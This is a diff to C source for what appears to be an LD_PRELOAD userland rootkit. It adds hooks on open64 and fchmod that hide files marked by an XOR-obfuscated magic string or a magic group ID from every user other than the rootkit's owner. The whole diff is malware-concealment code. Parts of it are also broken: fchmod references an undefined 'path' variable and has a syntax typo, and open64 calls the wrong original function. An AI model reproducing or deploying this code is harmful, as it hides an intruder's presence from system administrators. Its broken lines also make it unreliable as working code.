@@ -47,6 +47,7 @@ int (*old_symlink)(const char *path1, const char *path2);
 //file opening functions 
 int (*old_access)(const char *path, int amode); 
 int (*old_open)(const char *file, int oflag, ...);
+int (*old_open64)(const char *file, int oflag, ...);
 int (*old_openat)(int fd, const char *path, int oflag, ...);
 int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
 FILE *(*old_fopen)(const char *pathname, const char *mode); 
@@ -74,7 +75,9 @@ int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf,
 int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
 
 //permissions 
-int (*old_chmod)(const char *pathname, mode_t mode); 
+int (*old_chmod)(const char *pathname, mode_t mode);
+int (*old_fchmod)(int fd, mode_t mode);
+int (*old_fchmodat)(int dirfd, const char *pathname, mode_t mode, int flags);
 int (*old_chown)(const char *pathname, uid_t owner, gid_t group); 
 int (*old_fchown)(int fd, uid_t owner, gid_t group); 
 int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 
@@ -772,6 +775,28 @@ int open(const char *file, int oflag, ...)
 	return old_open(file, oflag);
 }
 
+int open64(const char *file, int oflag, ...)
+{ 
+	HOOK(open64); 
+	HOOK(__xstat); 
+	#ifdef DEBUG 
+	printf("[!] open64 hooked\n"); 
+	#endif 
+
+	if (owned()) return old_open64(file, oflag); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, file, &filestat); 
+	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic); 
+	return old_open(file, oflag); 
+}
+
 int openat(int fd, const char *path, int oflag, ...)
 { 
 	HOOK(openat); 
@@ -891,6 +916,28 @@ int chmod(const char *path, mode_t mode)
 	CLEAN(magic);
 	return old_chmod(path, mode);
 }
+
+int fchmod(int fd, mode_t mode)
+{ 
+	HOOK(fchmod);
+	#ifdef DEBUG 
+	printf("[!] fchmod hooked\n"); 
+	#endif 
+
+	struct stat filestat;
+	HOOK(__fxstat); 
+	old___fxstat(_STAT_VER, fd, &filestat); 
+	if (owned()) return old_fchmod(fd, mode); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic): 
+	return old_fchmod(fd, mode); 
+}	
 
 int chown(const char *pathname, uid_t owner, gid_t group)
 { 
